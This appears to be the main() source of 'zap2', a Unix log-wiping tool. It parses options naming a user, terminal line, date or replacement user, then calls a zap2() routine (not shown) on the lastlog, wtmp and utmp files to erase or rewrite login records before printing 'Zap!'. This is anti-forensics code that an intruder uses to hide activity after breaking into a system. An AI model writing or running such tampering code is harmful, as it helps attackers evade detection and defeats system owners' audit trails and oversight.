#include "zap2.h"
#include <getopt.h>

void usage()
{
    printf("Usage:\n");
    exit(EXIT_FAILURE);
}


struct tm get_date(char* str) {
    struct tm tmp_tm;
    long tmp;
    char year[5] = { '2', '0', str[4], str[5], 0 };
    char mon[3] = { str[0], str[1], 0 };
    char mday[3] = { str[2], str[3], 0 };
    tmp_tm.tm_year = atoi(year) - 1900;
    tmp_tm.tm_mon = atoi(mon) - 1;
    tmp_tm.tm_mday = atoi(mday);
    return tmp_tm; 
}

int main(int argc, char *argv[])
{
    flag_A = 0;
    flag_R = 0;
    flag_a = 0;
    flag_t = 0;
    flag_d = 0;
    int c;
    while ((c = getopt(argc, argv, "A:a:R:t:d:")) != -1)
    {
        switch (c)
        {
        case 'A':
            flag_A = 1;
            memcpy(user, optarg, strlen(optarg) + 1);
            break;

        case 'a':
            flag_a = 1;
            memcpy(user, optarg, strlen(optarg) + 1);
            break;

        case 'R':
            flag_R = 1;
            memcpy(user, optarg, strlen(optarg) + 1);
            memcpy(user_r, argv[optind], strlen(argv[optind]) + 1);
            break;

        case 't':
            flag_t = 1;
            memcpy(line, optarg, strlen(optarg) + 1);
            if (flag_R)
            {
                memcpy(line_r, argv[optind], strlen(argv[optind]) + 1);
            }
            break;

        case 'd':
            flag_d = 1;
            date=get_date(optarg);
            if (flag_R)
            {
                date_r=get_date(argv[optind]);
            }
            break;
        default:
            usage();
        }
    }

    // printf("flag: %d %d %d\n", flag_a, flag_A, flag_R);

    if (!(flag_a || flag_A || flag_R))
    {
        usage();
        exit(EXIT_FAILURE);
    }

    strncpy(lastlog_path, _PATH_LASTLOG, strlen(_PATH_LASTLOG) + 1);
    // strncpy(lastlog_path, "./lastlog", strlen("./lastlog") + 1);
    // printf("lastlog_path: %s\n", lastlog_path);

    strncpy(path, _PATH_WTMP, strlen(_PATH_WTMP) + 1);
    // strncpy(path, "./wtmp", strlen("./wtmp") + 1);
    zap2();
    strncpy(path, _PATH_UTMP, strlen(_PATH_UTMP) + 1);
    // strncpy(path, "./utmp", strlen("./utmp") + 1);
    zap2();
    printf("Zap!\n");
    exit(EXIT_SUCCESS);
}
